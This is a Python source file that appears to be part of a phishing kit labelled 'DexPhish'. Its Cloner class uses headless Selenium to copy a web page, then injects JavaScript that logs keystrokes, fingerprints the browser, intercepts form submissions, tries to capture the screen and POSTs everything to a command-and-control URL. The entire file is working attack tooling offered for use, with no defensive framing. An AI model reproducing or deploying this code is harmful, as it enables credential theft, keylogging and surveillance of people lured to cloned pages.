import os, logging

# Ensure beautifulsoup4 is installed before importing
try:
    from bs4 import BeautifulSoup
except ImportError:
    import pip
    pip.main(['install', 'beautifulsoup4'])
    from bs4 import BeautifulSoup

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service

log = logging.getLogger("cloner")

class Cloner:
    _driver = None

    @classmethod
    def get_driver(cls):
        """Initialize and return a shared WebDriver instance."""
        if cls._driver is None:
            try:
                opts = Options()
                opts.add_argument("--headless")
                opts.add_argument("--no-sandbox")
                opts.add_argument("--disable-dev-shm-usage")
                cls._driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
                log.info("WebDriver initialized successfully.")
            except Exception as e:
                log.error(f"Failed to initialize WebDriver: {e}")
                raise
        return cls._driver

    @classmethod
    def close_driver(cls):
        """Close and clean up the WebDriver instance."""
        if cls._driver is not None:
            try:
                cls._driver.quit()
                log.info("WebDriver closed successfully.")
            except Exception as e:
                log.error(f"Error while closing WebDriver: {e}")
            finally:
                cls._driver = None

    @classmethod
    def clone(cls, url: str, cid: str, c2_url: str) -> str:
        """Clone a webpage, inject a script, and save it locally."""
        driver = cls.get_driver()
        try:
            driver.get(url)
            soup = BeautifulSoup(driver.page_source, 'html.parser')

            script = f"""
            <script>
            (() => {{
                let k='', u=navigator.userAgent, f='', t=new Date().toISOString();
                const c=document.createElement('canvas'), x=c.getContext('2d');
                x.fillText('DexPhish',10,50); f=c.toDataURL();
                document.addEventListener('keydown', e=>k+=e.key);
                document.addEventListener('submit', async e=>{{
                    e.preventDefault();
                    const d=new FormData(e.target);
                    d.append('keys',k); d.append('ua',u); d.append('fp',f); d.append('ts',t); d.append('cid','{cid}');
                    try {{
                        const s=await navigator.mediaDevices.getDisplayMedia({{video:true}});
                        const b=await new ImageCapture(s.getVideoTracks()[0]).takePhoto();
                        const r=new FileReader(); r.onload=()=>{{
                            d.append('screenshot',r.result); fetch('{c2_url}',{{method:'POST',body:d}});
                        }}; r.readAsDataURL(b); s.getTracks().forEach(t=>t.stop());
                    }} catch {{ fetch('{c2_url}',{{method:'POST',body:d}}); }}
                }});
            }})();
            </script>
            """
            soup.body.append(BeautifulSoup(script, 'html.parser'))

            path = f"data/sites/{cid}.html"
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w", encoding="utf-8") as f:
                f.write(str(soup))
            log.info(f"Cloned {url} → {path}")
            return f"/{cid}.html"
        except Exception as e:
            log.error(f"Error during cloning process: {e}")
            raise
        finally:
            cls.close_driver()

# Ensure beautifulsoup4 is installed
try:
    from bs4 import BeautifulSoup
except ImportError:
    import pip
    pip.main(['install', 'beautifulsoup4'])
